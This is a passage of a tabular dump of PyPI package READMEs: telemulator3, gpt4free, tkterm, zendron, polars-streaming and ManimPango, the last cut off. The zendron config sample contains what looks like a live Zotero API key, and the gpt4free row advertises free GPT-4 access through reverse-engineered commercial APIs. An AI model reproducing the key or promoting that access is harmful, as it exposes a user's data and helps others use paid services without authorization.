from telemulator3 import Telemulator

bot = TeleBot('xxx-yyy-zzz', threaded=False)

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, ""Howdy, how are you doing?"")

telemul = Telemulator()
telemul.set_tested_bot(bot, username='my_bot', name='My Bot')
```

At start, there are no registered users in emulated API.

```python
assert not telemul.api.users
```

Make API user, that represent our bot.
It's a first registered user.

```python
mybot = telemul.api.get_me()
assert mybot.is_bot
assert mybot.username == 'my_bot'
assert len(telemul.api.users) == 1
```

New user open private chat with bot and send `/start` command.
Bot must answer as defined and his answer must be in chat history.

```python
from telemulator3 import send_command

user = telemul.api.create_user('User')
chat = user.private()
send_command(chat, '/start', user)
assert chat.history.contain('Howdy, how are you doing?')
```

User create group and add bot as member.

```python
group = user.create_group('My group')
group.add_members(user, [mybot])
assert group.history.contain('invite new members:')
```

And so on.

```python
mybot.leave(group)
assert group.history.contain('My Bot (ID 1) left chat')
# group.history.dump()
```

## Development

```
$ git clone git@github.com:vb64/telemulator3
$ cd telemulator3
$ make setup PYTHON_BIN=/path/to/python3
$ make tests
```
","# Library telemulator3

[![GitHub Workflow Status](https://img.shields.io/github/actions/workflow/status/vb64/telemulator3/pep257.yml?label=Pep257&style=plastic&branch=main)](https://github.com/vb64/telemulator3/actions?query=workflow%3Apep257)
[![GitHub Workflow Status](https://img.shields.io/github/actions/workflow/status/vb64/telemulator3/py3.yml?label=Python%203.7-3.11&style=plastic&branch=main)](https://github.com/vb64/telemulator3/actions?query=workflow%3Apy3)
[![Codacy Badge](https://app.codacy.com/project/badge/Grade/fe568012ee1649b89bafbb4de163a0c0)](https://app.codacy.com/gh/vb64/telemulator3/dashboard?utm_source=gh&utm_medium=referral&utm_content=&utm_campaign=Badge_grade)
[![Codacy Badge](https://app.codacy.com/project/badge/Coverage/fe568012ee1649b89bafbb4de163a0c0)](https://app.codacy.com/gh/vb64/telemulator3/dashboard?utm_source=gh&utm_medium=referral&utm_content=&utm_campaign=Badge_coverage)

The free, open-source telemulator3 library designed to simplify automatic testing of Telegram bots created using the [pyTelegramBotAPI library](https://github.com/eternnoir/pyTelegramBotAPI).

The telemulator3 library partially emulates the Telegram Bot API in unit tests and allows you to create typical scenarios for the interaction of your bot with the Telegram Bot API.

## Installation

```bash
pip install telemulator3
```

## Usage

Create TeleBot instance and start emulate Telegram API for bot.

```python
from telebot import TeleBot
from telemulator3 import Telemulator

bot = TeleBot('xxx-yyy-zzz', threaded=False)

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, ""Howdy, how are you doing?"")

telemul = Telemulator()
telemul.set_tested_bot(bot, username='my_bot', name='My Bot')
```

At start, there are no registered users in emulated API.

```python
assert not telemul.api.users
```

Make API user, that represent our bot.
It's a first registered user.

```python
mybot = telemul.api.get_me()
assert mybot.is_bot
assert mybot.username == 'my_bot'
assert len(telemul.api.users) == 1
```

New user open private chat with bot and send `/start` command.
Bot must answer as defined and his answer must be in chat history.

```python
from telemulator3 import send_command

user = telemul.api.create_user('User')
chat = user.private()
send_command(chat, '/start', user)
assert chat.history.contain('Howdy, how are you doing?')
```

User create group and add bot as member.

```python
group = user.create_group('My group')
group.add_members(user, [mybot])
assert group.history.contain('invite new members:')
```

And so on.

```python
mybot.leave(group)
assert group.history.contain('My Bot (ID 1) left chat')
# group.history.dump()
```

## Development

```
$ git clone git@github.com:vb64/telemulator3
$ cd telemulator3
$ make setup PYTHON_BIN=/path/to/python3
$ make tests
```
",vb64/telemulator3
gpt4free,https://github.com/rzashakeri/gpt4free,13,196,196,"decentralising the Ai Industry, free gpt-4/3.5 scripts through several reverse engineered api's ( poe.com, phind.com, chat.openai.com, writesonic.com, sqlchat.ai, t3nsor.com, you.com etc...)


","decentralising the Ai Industry, free gpt-4/3.5 scripts through several reverse engineered api's ( poe.com, phind.com, chat.openai.com, writesonic.com, sqlchat.ai, t3nsor.com, you.com etc...)


",rzashakeri/gpt4free
tkterm,https://github.com/dhanoosu/tkterm,0,3351,3122,"[![PyPI](https://img.shields.io/pypi/v/tkterm)](https://pypi.org/project/tkterm)
![PyPI - Python Version](https://img.shields.io/pypi/pyversions/tkterm)
![Platform](https://img.shields.io/powershellgallery/p/Pester?color=blue)

# TkTerm - Tkinter Terminal Emulator
A fully functional terminal emulator built on Tkinter library - perform all basic commands of a terminal

<p align=""center"">
<img src=""https://raw.githubusercontent.com/dhanoosu/TkTerm/master/tkterm/img/snapshot2.png"">
</p>

Under the hood it executes commands using Python's *subprocess* module and spawn as a thread. Pressing `Ctrl-C` will terminate current running command. Supports Unix shells (`sh` and `bash`) and Window's Command Prompt (`cmd.exe`) commands.

## Features
- Compatible with Windows and Unix systems
- Tabbed Terminal - `click & drag` to reorder, `middle-click` to close tab, `double-click` to rename
- Return Code (RC) of previous run commands is shown at the bottom status bar
- Settings to customise colours, font and cursor shape
- **Ctrl-C** to kill current running process
- **Ctrl-F** to search; supports case sensitivity and regex searches
- **UP** and **DOWN** arrow keys to cycle between next and previous commands in history
- Unix-like **tab completion** on files and directories
- Handles **multiline commands** using caret character `^` or `\`

## Requirements
The Tkinter GUI library is built into Python, so no 3rd party library is required.

Requires at least Python version 3.x and above.

## Installation
Get it from Github or PIP package manager

```bash
# From github
git clone https://github.com/dhanoosu/TkTerm.git

# From package manager
pip install tkterm
```

## Standalone usage
Navigate to downloaded folder and run script with

```bash
cd TkTerm

# Either of these will work
python tkterm
python tkterm/tkterm.py
```

If package was installed via pip

```bash
python -m tkterm
```

## Integration with other Tkinter application
The Terminal is implemented as a `Frame` widget and can easily be integrated to other Tkinter application by

```python
import tkinter as tk
from tkinter import *
from tkterm import Terminal

root = tk.Tk()

terminal = Terminal(root)
terminal.pack(fill=BOTH, expand=True)

root.mainloop()
```

> If downloaded via github append to system path before import
> ```python
> import sys
> sys.path.insert(0, ""./TkTerm"")
> from tkterm import Terminal
> ```

## Customisation options
Customise Terminal interface by `Right-click > Settings...`

<p align=""center"">
<img src=""https://raw.githubusercontent.com/dhanoosu/TkTerm/master/tkterm/img/settings.png"">
</p>

**Note**: \
Clicking `Save config` saves setting configuration to a file.\
Tkterm will automatically load this file the next time it starts up.

## Multiline command
Long lines of command can be broken up using a caret. A caret at the line end appends the next line command with the current command.
In Windows the caret is `^`, and UNIX is `\`.

For multiline command to be considered there must be ***no** trailing space after the caret*, for example:

- `$> ping ^` is considered
- `$> ping ^ ` is **not** considered

```bash
$>> echo I ^
> have apple ^
> and banana
I have apple and banana
```

## Author

Developed by Dhanoo Surasarang

Github: [@dhanoosu](https://github.com/dhanoosu)

## Links

- **GitHub:** https://github.com/dhanoosu/TkTerm
","[![PyPI](https://img.shields.io/pypi/v/tkterm)](https://pypi.org/project/tkterm)
![PyPI - Python Version](https://img.shields.io/pypi/pyversions/tkterm)
![Platform](https://img.shields.io/powershellgallery/p/Pester?color=blue)

# TkTerm - Tkinter Terminal Emulator
A fully functional terminal emulator built on Tkinter library - perform all basic commands of a terminal





Under the hood it executes commands using Python's *subprocess* module and spawn as a thread. Pressing `Ctrl-C` will terminate current running command. Supports Unix shells (`sh` and `bash`) and Window's Command Prompt (`cmd.exe`) commands.

## Features
- Compatible with Windows and Unix systems
- Tabbed Terminal - `click & drag` to reorder, `middle-click` to close tab, `double-click` to rename
- Return Code (RC) of previous run commands is shown at the bottom status bar
- Settings to customise colours, font and cursor shape
- **Ctrl-C** to kill current running process
- **Ctrl-F** to search; supports case sensitivity and regex searches
- **UP** and **DOWN** arrow keys to cycle between next and previous commands in history
- Unix-like **tab completion** on files and directories
- Handles **multiline commands** using caret character `^` or `\`

## Requirements
The Tkinter GUI library is built into Python, so no 3rd party library is required.

Requires at least Python version 3.x and above.

## Installation
Get it from Github or PIP package manager

```bash
# From github
git clone https://github.com/dhanoosu/TkTerm.git

# From package manager
pip install tkterm
```

## Standalone usage
Navigate to downloaded folder and run script with

```bash
cd TkTerm

# Either of these will work
python tkterm
python tkterm/tkterm.py
```

If package was installed via pip

```bash
python -m tkterm
```

## Integration with other Tkinter application
The Terminal is implemented as a `Frame` widget and can easily be integrated to other Tkinter application by

```python
import tkinter as tk
from tkinter import *
from tkterm import Terminal

root = tk.Tk()

terminal = Terminal(root)
terminal.pack(fill=BOTH, expand=True)

root.mainloop()
```

> If downloaded via github append to system path before import
> ```python
> import sys
> sys.path.insert(0, ""./TkTerm"")
> from tkterm import Terminal
> ```

## Customisation options
Customise Terminal interface by `Right-click > Settings...`





**Note**: \
Clicking `Save config` saves setting configuration to a file.\
Tkterm will automatically load this file the next time it starts up.

## Multiline command
Long lines of command can be broken up using a caret. A caret at the line end appends the next line command with the current command.
In Windows the caret is `^`, and UNIX is `\`.

For multiline command to be considered there must be ***no** trailing space after the caret*, for example:

- `$> ping ^` is considered
- `$> ping ^ ` is **not** considered

```bash
$>> echo I ^
> have apple ^
> and banana
I have apple and banana
```

## Author

Developed by Dhanoo Surasarang

Github: [@dhanoosu](https://github.com/dhanoosu)

## Links

- **GitHub:** https://github.com/dhanoosu/TkTerm
",dhanoosu/tkterm
password-manager445,https://github.com/TheCodingFreakj/password-manager,0,48,48,"A simple python wrapper for creating passwords
","A simple python wrapper for creating passwords
",thecodingfreakj/password-manager
zendron,https://github.com/Mjvolk3/Zendron,13,7903,7806,"# Zendron

[zendron Github](https://github.com/Mjvolk3/Zendron)

[![PyPI version](https://badge.fury.io/py/zendron.svg)](https://badge.fury.io/py/zendron)

## Introduction

- This package was developed for porting Zotero annotations and metadata to markdown. These markdown notes are then brought into a [Dendron](https://www.dendron.so/) hierarchy for integration with vault notes. We recommend using the package within [Visual Studio Code](https://code.visualstudio.com/).The end goal is to get a two way sync between notes in Zotero and notes in Dendron, but this has some difficulties and limitations that are taking some time to address. For now only a one way sync from Zotero to Dendron is supported.

## Install Instructions

- It is recommended to build a [conda env](https://conda.io/projects/conda/en/latest/user-guide/tasks/manage-environments.html) for installation.
- Install [Dendron CLI](https://wiki.dendron.so/notes/RjBkTbGuKCXJNuE4dyV6G/).
  - `npm install -g @dendronhq/dendron-cli@latest`
- Install the zendron
  - `python -m pip install zendron`

## Zotero Local Setup

- To start you need [Better BibTeX for Zotero](https://retorque.re/zotero-better-bibtex/installation/)
  - This allows pinning of of bibtex keys.v
- Go to `Zotero > Settings... > Advanced > General > Config Editor`![](https://github.com/Mjvolk3/Zendron/raw/main/notes/assets/images/zendron.citation-key.md.zotero-config-editor.png)
- Accept the risks ![](https://github.com/Mjvolk3/Zendron/raw/main/notes/assets/images/zendron.citation-key.md.zotero-config-editor-accept-risks.png)
- In the Search, type `autoPinDelay` and chance the integer value from 0 (default) to 1. ![](https://github.com/Mjvolk3/Zendron/raw/main/notes/assets/images/zendron.citation-key.md.autoPinDelay-update.png)

## Zotero API key

- [Zotero API key](https://www.zotero.org/settings/keys)
- We recommend setting up you Zotero API key with the following settings to allow for full functionality.
  - Personal Library
    - [x] Allow library access.
    - [x] Allow notes access.
    - [x] Allow write access.
  - Default Gropu Permissions
    - [x] Read/Write

![](https://github.com/Mjvolk3/Zendron/raw/main/notes/assets/images/zotero.api-key.md.zotero-api-key.png)

- This key can then be copy pasted in the configuration file. You should add your key to `.gitignore` to prevent others from accessing your Zotoero database. If the key is lost you can always generate a new one.

## Zotero and File Import Configuration

All zendron configuration is handled in [config.yml](https://github.com/Mjvolk3/Zendron/raw/main/conf/config.yaml).

```yml
library_id : 4932032 # Zotero library ID
library_type : group # [user, group] library
api_key : FoCauOvWMlNdYmpYuY5JplTw # Zotero API key
collection: null # Name of Zotero Collection, null for entire library
item_types: [journalArticle, book, preprint, conferencePaper, report] # List of item types according to [pyzotero](https://pyzotero.readthedocs.io/en/latest/)
local_image_path: /Users/<username>/Zotero/cache # Local path for importing annotated images
dendron_limb: zendron.import # Dendron import limb e.g. zendron.import.paper-title.annotations.md
zotero_comment_title: zendron comment # fixed for now... needed for eventual 2-way sync.
pod_path: zotero_pod # Name of dendron pod, removed after completion of import. We will later add configuration for this to remain. This will allow for non Dendron users to import markdown Zotero notes in a strucutred hierarchy.
```

- `library_id` - Integer identifier of library. This is the number that matches the name of a library.
  - [User ID](https://www.zotero.org/settings/keys).
  - For group ID visit [Zotero Groups](https://www.zotero.org/groups/), click on your desired group, and copy the id from the URL.
- `library_type`: `group` for group libraries and `user` for user library.
- `api_key`: Use the API Key obtained from [Zotero API KEY](README.md#zotero-api-key).
- `collection`: This can be the name of any collection or subcollection in the specificed library. If there are multiple collections or sub collections with the same name, the import will arbitrarily choose one. To make sure you are importing the desired collection, make sure the name of the collection is unique in the Zotero library.
- `item_types`: Zotero item types to import according to [pyzotero](https://pyzotero.readthedocs.io/en/latest/) syntax.
`local_image_path`: Path to annotated images. `/Users/<username>/Zotero/cache` is the default path on MacOS.
- `dendron_limb`: This is the period deliminated hierarchy prefix to all file imports for Dendron, e.g. `root.zotero.import.<paper_title>.annotations.md`.
- `zotero comment title` - IGNORE FOR NOW. Eventually needed for 2-way sync.
- `pod_path` - IGNORE FOR NOW. Eventually needed for markdown only import, without Dendron integration.

## Basic Usage

There are only two basic commands that work as of now.

- `zendron`
  - This command should only be run in the root directory of the workspace.
  - This command imports notes according to a defined [config.yml](https://github.com/Mjvolk3/Zendron/raw/main/conf/config.yaml). Once the command is run the first time the user needs to modify their configuration `./conf/config.yaml`. All required configs are marked with a comment `# STARTER CONFIG` upon initialization.
  - Notes are imported with a `## Time Created` heading. This allows for stable reference from other notes, within the note vault. We autogenerate a `*.comments.md` that should be used for taking any additional notes within Dendron. Additional notes taken within the meta data file (`notes/zendron.import.<paper-title>.md`), or the `*.annotations.md` will be overwritten after running `zendron` for a second time. All files downstream of import excpet `*.comments.md` should be treated as read only. We have plans to explicitly make them read only soon.
  - Upon import, notes and tags are left as stubs. To create these notes run `> Dendron: Doctor` then `createMissingLinkedNotes`. It is best practice to correc tag warnings before doing this.
- `zendron remove=true`
  - This command removes imported notes and associated links. This command works by remove all notes downstream fo `dendron_limb`, excpet for `comments.md`. There is some difficult removing other files created becuase these are separate from the `dendron_limb`. These files include `user.*.md`, which comes from bibtex keys, and `tags.*.md` which come from metadata and annotation tags. For now, we don't remove tags, but we do remove bibex keys (`<user.bibtex_key>.md`).
  - There are more complicated removal's that could be desired so we plan to eventually change this from a `bool` to an `str`.

## Miscellaneous

- The `zendron_cache` is used for remove of `<user.bibtex_key>.md`. If it is deleted and you run remove, the `<user.bibtex_key>.md` will not be removed. In this case you can run `zendron` again, then run the `zendron remove=true` again.
- If there are run that fail, sometimes a `.hydra` with the given configuraiton will be generated in the root dir. This isn't an issue but it contains the API information and should therefore be added to the `.gitignore` as a safeguard. In addition these files can be used to inspect the reason for the faiure.
- `__main__.log` is generated after running a `zendron`, this can also be deleted as you please. It is also useful for inspecting an failures to import.

## Troubleshooting

- If you are having trouble with startup you can use this [Zendron-Test](https://github.com/Mjvolk3/Zendron-Test) template and try to reproduce your issues here. Simply click on `Use this template`, clone the repo and try to run `zendron` here. This will allow for us to catch things we overlooked for different user workspace configuration etc. Once you have tried to reproduce issues here please submit an issue on [Zendron](https://github.com/Mjvolk3/Zendron).
","# Zendron

[zendron Github](https://github.com/Mjvolk3/Zendron)

[![PyPI version](https://badge.fury.io/py/zendron.svg)](https://badge.fury.io/py/zendron)

## Introduction

- This package was developed for porting Zotero annotations and metadata to markdown. These markdown notes are then brought into a [Dendron](https://www.dendron.so/) hierarchy for integration with vault notes. We recommend using the package within [Visual Studio Code](https://code.visualstudio.com/).The end goal is to get a two way sync between notes in Zotero and notes in Dendron, but this has some difficulties and limitations that are taking some time to address. For now only a one way sync from Zotero to Dendron is supported.

## Install Instructions

- It is recommended to build a [conda env](https://conda.io/projects/conda/en/latest/user-guide/tasks/manage-environments.html) for installation.
- Install [Dendron CLI](https://wiki.dendron.so/notes/RjBkTbGuKCXJNuE4dyV6G/).
  - `npm install -g @dendronhq/dendron-cli@latest`
- Install the zendron
  - `python -m pip install zendron`

## Zotero Local Setup

- To start you need [Better BibTeX for Zotero](https://retorque.re/zotero-better-bibtex/installation/)
  - This allows pinning of of bibtex keys.v
- Go to `Zotero > Settings... > Advanced > General > Config Editor`![](https://github.com/Mjvolk3/Zendron/raw/main/notes/assets/images/zendron.citation-key.md.zotero-config-editor.png)
- Accept the risks ![](https://github.com/Mjvolk3/Zendron/raw/main/notes/assets/images/zendron.citation-key.md.zotero-config-editor-accept-risks.png)
- In the Search, type `autoPinDelay` and chance the integer value from 0 (default) to 1. ![](https://github.com/Mjvolk3/Zendron/raw/main/notes/assets/images/zendron.citation-key.md.autoPinDelay-update.png)

## Zotero API key

- [Zotero API key](https://www.zotero.org/settings/keys)
- We recommend setting up you Zotero API key with the following settings to allow for full functionality.
  - Personal Library
    - [x] Allow library access.
    - [x] Allow notes access.
    - [x] Allow write access.
  - Default Gropu Permissions
    - [x] Read/Write

![](https://github.com/Mjvolk3/Zendron/raw/main/notes/assets/images/zotero.api-key.md.zotero-api-key.png)

- This key can then be copy pasted in the configuration file. You should add your key to `.gitignore` to prevent others from accessing your Zotoero database. If the key is lost you can always generate a new one.

## Zotero and File Import Configuration

All zendron configuration is handled in [config.yml](https://github.com/Mjvolk3/Zendron/raw/main/conf/config.yaml).

```yml
library_id : 4932032 # Zotero library ID
library_type : group # [user, group] library
api_key : FoCauOvWMlNdYmpYuY5JplTw # Zotero API key
collection: null # Name of Zotero Collection, null for entire library
item_types: [journalArticle, book, preprint, conferencePaper, report] # List of item types according to [pyzotero](https://pyzotero.readthedocs.io/en/latest/)
local_image_path: /Users//Zotero/cache # Local path for importing annotated images
dendron_limb: zendron.import # Dendron import limb e.g. zendron.import.paper-title.annotations.md
zotero_comment_title: zendron comment # fixed for now... needed for eventual 2-way sync.
pod_path: zotero_pod # Name of dendron pod, removed after completion of import. We will later add configuration for this to remain. This will allow for non Dendron users to import markdown Zotero notes in a strucutred hierarchy.
```

- `library_id` - Integer identifier of library. This is the number that matches the name of a library.
  - [User ID](https://www.zotero.org/settings/keys).
  - For group ID visit [Zotero Groups](https://www.zotero.org/groups/), click on your desired group, and copy the id from the URL.
- `library_type`: `group` for group libraries and `user` for user library.
- `api_key`: Use the API Key obtained from [Zotero API KEY](README.md#zotero-api-key).
- `collection`: This can be the name of any collection or subcollection in the specificed library. If there are multiple collections or sub collections with the same name, the import will arbitrarily choose one. To make sure you are importing the desired collection, make sure the name of the collection is unique in the Zotero library.
- `item_types`: Zotero item types to import according to [pyzotero](https://pyzotero.readthedocs.io/en/latest/) syntax.
`local_image_path`: Path to annotated images. `/Users//Zotero/cache` is the default path on MacOS.
- `dendron_limb`: This is the period deliminated hierarchy prefix to all file imports for Dendron, e.g. `root.zotero.import..annotations.md`.
- `zotero comment title` - IGNORE FOR NOW. Eventually needed for 2-way sync.
- `pod_path` - IGNORE FOR NOW. Eventually needed for markdown only import, without Dendron integration.

## Basic Usage

There are only two basic commands that work as of now.

- `zendron`
  - This command should only be run in the root directory of the workspace.
  - This command imports notes according to a defined [config.yml](https://github.com/Mjvolk3/Zendron/raw/main/conf/config.yaml). Once the command is run the first time the user needs to modify their configuration `./conf/config.yaml`. All required configs are marked with a comment `# STARTER CONFIG` upon initialization.
  - Notes are imported with a `## Time Created` heading. This allows for stable reference from other notes, within the note vault. We autogenerate a `*.comments.md` that should be used for taking any additional notes within Dendron. Additional notes taken within the meta data file (`notes/zendron.import..md`), or the `*.annotations.md` will be overwritten after running `zendron` for a second time. All files downstream of import excpet `*.comments.md` should be treated as read only. We have plans to explicitly make them read only soon.
  - Upon import, notes and tags are left as stubs. To create these notes run `> Dendron: Doctor` then `createMissingLinkedNotes`. It is best practice to correc tag warnings before doing this.
- `zendron remove=true`
  - This command removes imported notes and associated links. This command works by remove all notes downstream fo `dendron_limb`, excpet for `comments.md`. There is some difficult removing other files created becuase these are separate from the `dendron_limb`. These files include `user.*.md`, which comes from bibtex keys, and `tags.*.md` which come from metadata and annotation tags. For now, we don't remove tags, but we do remove bibex keys (`.md`).
  - There are more complicated removal's that could be desired so we plan to eventually change this from a `bool` to an `str`.

## Miscellaneous

- The `zendron_cache` is used for remove of `.md`. If it is deleted and you run remove, the `.md` will not be removed. In this case you can run `zendron` again, then run the `zendron remove=true` again.
- If there are run that fail, sometimes a `.hydra` with the given configuraiton will be generated in the root dir. This isn't an issue but it contains the API information and should therefore be added to the `.gitignore` as a safeguard. In addition these files can be used to inspect the reason for the faiure.
- `__main__.log` is generated after running a `zendron`, this can also be deleted as you please. It is also useful for inspecting an failures to import.

## Troubleshooting

- If you are having trouble with startup you can use this [Zendron-Test](https://github.com/Mjvolk3/Zendron-Test) template and try to reproduce your issues here. Simply click on `Use this template`, clone the repo and try to run `zendron` here. This will allow for us to catch things we overlooked for different user workspace configuration etc. Once you have tried to reproduce issues here please submit an issue on [Zendron](https://github.com/Mjvolk3/Zendron).
",mjvolk3/zendron
polars-streaming,https://github.com/VinishUchiha/polars-streaming,10,406,368,"<div align=""center"">

# polars-streaming

<div align=""left"">

This library helps to process streaming data using Polars.

## Installation
```bash
pip install polars-streaming
```
**Install from sources**

Alternatively, you can also clone the latest version from the [repository](https://github.com/VinishUchiha/polars-streaming) and install it directly from the source code:

```bash
pip install -e .
```
","

# polars-streaming



This library helps to process streaming data using Polars.

## Installation
```bash
pip install polars-streaming
```
**Install from sources**

Alternatively, you can also clone the latest version from the [repository](https://github.com/VinishUchiha/polars-streaming) and install it directly from the source code:

```bash
pip install -e .
```
",vinishuchiha/polars-streaming
inkt,https://github.com/ManimCommunity/manimpango,0,7403,6377,"# ManimPango

<p align=""center"">
    <a href=""https://pypi.org/project/manimpango/""><img src=""https://img.shields.io/pypi/v/manimpango.svg?style=flat&logo=pypi"" alt=""PyPI Latest Release""></a>
    <a href=""https://pypi.org/project/manimpango/""><img alt=""PyPI - Wheel"" src=""https://img.shields.io/pypi/wheel/manimpango""></a>
    <a href=""https://pypi.org/project/manimpango/""><img alt=""PyPI - Downloads"" src=""https://img.shields.io/pypi/dm/manimpango""></a>
    <a href=""https://choosealicense.com/licenses/mit/""><img alt=""PyPI - License"" src=""https://img.shields.io/pypi/l/manimpango""></a>
    <a href=""https://pypi.org/project/manimpango/""><img alt=""PyPI - Python Version"" src=""https://img.shields.io/pypi/pyversions/ManimPango.svg?style=flat""></a>
    <a href='https://manimpango.readthedocs.io/en/latest/?badge=latest'><img src='https://readthedocs.org/projects/manimpango/badge/?version=latest' alt='Documentation Status' /></a>
    <br>
    <img src=""https://github.com/ManimCommunity/manimpango/workflows/Build%20Wheels/badge.svg"">
</p>

**ManimPango** is a C binding for [Pango](https://pango.gnome.org/) using [Cython](https://cython.org/), which is internally used in [Manim](https://www.manim.community) to render (non-LaTeX) text.



## INSTALL

Installing **ManimPango** is super easy, just use `pip`. It is [`manimpango`](https://pypi.org/project/manimpango/) in PyPi.

```sh
pip install manimpango
```

For **Linux Users**, there are no Wheels. You must have a C compiler as well as **Pango** and its dependencies along with the **Pango** development headers. See [BUILDING](#BUILDING) for more information.

## WORKFLOW SETUP / CONTRIBUTING

To make it easier for developers to contribute, we have a pre-commit workflow that will check for `black` formatting and `flake` checking.

```sh
pip install pre-commit
pre-commit install
```

## BUILDING

### Linux/MacOS

For building **ManimPango**, you need
* a C compiler
* Python's development headers
* [`pkg-config`](https://www.freedesktop.org/wiki/Software/pkg-config/)
* [Pango](https://pango.gnome.org) along with its development headers and its dependencies.

If you are on MacOS, you can use [brew](https://brew.sh) to install those. Using [MacPorts](https://www.macports.org) is also possible, but their version of **Pango** is old and will probably not be updated in the near future.

```sh
brew install pango pkg-config
```

If you are on Linux, you can use a system package manager to do so. For example, if you are on Debian based system, you can use `apt`

```sh
apt install libpango1.0-dev pkg-config python3-dev
```

**Arch Linux:** `pacman -S pango pkgconf`

**Fedora:** `dnf install pango-devel pkg-config python3-devel`

Or similar in your system's package manager.

#### Using `tar` archives

If you don't want to contribute to this repository, you can use the tar archives published in PyPi, or just use `pip` to install using

```sh
pip install manimpango --no-binary :all:
```

**Note**: `pip` by default uses wheels, so make sure to pass the `--no-binary` parameter.

#### Using `git` clones / Contributing

Please remember to do this inside your virtual environment, if you want to use your **Manimpango** with **Manim**.

```sh
python -m venv ./venv
source venv/bin/activate # Linux/macOS
venv\Scripts\activate # Windows
```

If you are using a clone of this repository, you will need [Cython](https://cython.org) which can be easily installed using `pip`:

```sh
pip install Cython
```

After that you can use `pip` to install the clone with the following command:

```sh
pip install -e .
pip install -r requirements-dev.txt .
```

Next, run the setup script:

```sh
python setup.py build_ext -i
```

After installation is complete, you should be able to run pytest:

```sh
pytest
```

You will need to this way if you want to *contribute* to **ManimPango**.

### Contributing with Windows

*If you are a normal user, don't read this, you have wheels which you can just install directly using pip.*

If you want to contribute to **ManimPango** and you are on Windows, this section is for you.

As Windows does not include a C compiler by default, you will first need to install one. You have two choices:

1. MinGW/Msys2

2. Visual Studio

#### MinGW/Msys2

1. Download **MSYS2** from the download link provided on their page https://www.msys2.org/#installation and install it according to their instructions.
2. Once you have **MSYS2** installed,  it offers you three different shells: the **MinGW32** shell, the **MinGW64** shell and **MSYS** shell. In order for the following steps to work, you have to open the **MSYS2 MinGW64** shell (you can search for this). Small hint: it has a blue color logo.
3. Run the following commands to install Python, Pango, Cython, Numpy, Scipy, Pillow, Pycairo and ffmpeg
```sh
pacman -S mingw-w64-x86_64-python
pacman -S mingw-w64-x86_64-python-pip
pacman -S mingw-w64-x86_64-pango
pacman -S mingw-w64-x86_64-cython
pacman -S mingw-w64-x86_64-python-numpy
pacman -S mingw-w64-x86_64-python-scipy
pacman -S mingw-w64-x86_64-python-pillow
pacman -S mingw-w64-x86_64-python-cairo
pacman -S mingw-w64-x86_64-ffmpeg
```
4. Still in the same shell, install **Manim** using `pip install manim`.
5. Finally, get your clone of **ManimPango**, `cd` into that directory and then run `pip install -e .`.
**Note** You can't use it with your regular Python version. It will cause weird errors if you do so. For working with **ManimPango**, you must be inside the `MSYS2 MINGW64 shell`.
6. You can then use `manim` inside that shell, to run **Manim**.
**Hint**: If you want to try out Python interactively, you can open `idle` using the command `python -m idlelib`  inside that shell.

#### Visual Studio

First, install Visual Studio as specified in https://wiki.python.org/moin/WindowsCompilers. Possibly Visual Studio Build Tools 2019 with Windows10 SDK.

Then run the script at `packing/download_dlls.py`. This will get a **Pango** build along with `pkg-config` and install it at `C:\cibw\vendor`. Add `C:\cibw\vendor\bin` and `C:\cibw\vendor\pkg-config\bin` to PATH.

**Note:** You can change the install location by editing line 24 of the file `packing/download_dlls.py`.

Then set an environment variable `PKG_CONFIG_PATH`=`C:\cibw\vendor\lib\pkgconfig`.

Then you can install Cython using

```sh
pip install Cython
```

Finally, you can install your local **ManimPango** clone just like any other python package by typing:

```sh
pip install .
```

**Important**: You have to to use https://docs.python.org/3/library/os.html#os.add_dll_directory before running **ManimPango**. Alternatively, you need to copy the `dll` at `C:\cibw\vendor\bin` to the folder where **ManimPango** is compiled.  This is applicable for Python 3.8 and above.

```python
import os
os.add_dll_directory('C:\cibw\vendor\bin')
```

## Code of Conduct

Our full code of conduct, and how we enforce it, can be read on [our website](https://docs.manim.community/en/latest/conduct.html).

## License

This project is licensed under MIT License. The wheels distributed on PyPI contains compiled version of Pango and Cairo subject to terms of the GNU LGPL and other licenses. Consult the licenses of each library for more informations.
","# ManimPango












**ManimPango** is a C binding for [Pango](https://pango.gnome.org/) using [Cython](https://cython.org/), which is internally used in [Manim](https://www.manim.community) to render (non-LaTeX) text.



## INSTALL

Installing **ManimPango** is super easy, just use `pip`. It is [`manimpango`](https://pypi.org/project/manimpango/) in PyPi.

```sh
pip install manimpango
```

For **Linux Users**, there are no Wheels. You must have a C compiler as well as **Pango** and its dependencies along with the **Pango** development headers. See [BUILDING](#BUILDING) for more information.

## WORKFLOW SETUP / CONTRIBUTING

To make it easier for developers to contribute, we have a pre-commit workflow that will check for `black` formatting and `flake` checking.

```sh
pip install pre-commit
pre-commit install
```

## BUILDING

### Linux/MacOS

For building **ManimPango**, you need
* a C compiler
* Python's development headers
* [`pkg-config`](https://www.freedesktop.org/wiki/Software/pkg-config/)
* [Pango](https://pango.gnome.org) along with its development headers and its dependencies.

If you are on MacOS, you can use [brew](https://brew.sh) to install those. Using [MacPorts](https://www.macports.org) is also possible, but their version of **Pango** is old and will probably not be updated in the near future.

```sh
brew install pango pkg-config
```

If you are on Linux, you can use a system package manager to do so. For example, if you are on Debian based system, you can use `apt`

```sh
apt install libpango1.0-dev pkg-config python3-dev
```

**Arch Linux:** `pacman -S pango pkgconf`

**Fedora:** `dnf install pango-devel pkg-config python3-devel`

Or similar in your system's package manager.

#### Using `tar` archives

If you don't want to contribute to this repository, you can use the tar archives published in PyPi, or just use `pip` to install using

```sh
pip install manimpango --no-binary :all:
```

**Note**: `pip` by default uses wheels, so make sure to pass the `--no-binary` parameter.

#### Using `git` clones / Contributing

Please remember to do this inside your virtual environment, if you want to use your **Manimpango** with **Manim**.

```sh
python -m venv ./venv
source venv/bin/activate # Linux/macOS
venv\Scripts\activate # Windows
```

If you are using a clone of this repository, you will need [Cython](https://cython.org) which can be easily installed using `pip`:

```sh
pip install Cython
```

After that you can use `pip` to install the clone with the following command:

```sh
pip install -e .
pip install -r requirements-dev.txt .
```

Next, run the setup script:

```sh
python setup.py build_ext -i
```

After installation is complete, you should be able to run pytest:

```sh
pytest
```

You will need to this way if you want to *contribute* to **ManimPango**.

### Contributing with Windows

*If you are a normal user, don't read this, you have wheels which you can just install directly using pip.*

If you want to contribute to **ManimPango** and you are on Windows, this section is for you.

As Windows does not include a C compiler by default, you will first need to install one. You have two choices:

1. MinGW/Msys2

2. Visual Studio

#### MinGW/Msys2

1. Download **MSYS2** from the download link provided on their page https://www.msys2.org/#installation and install it according to their instructions.
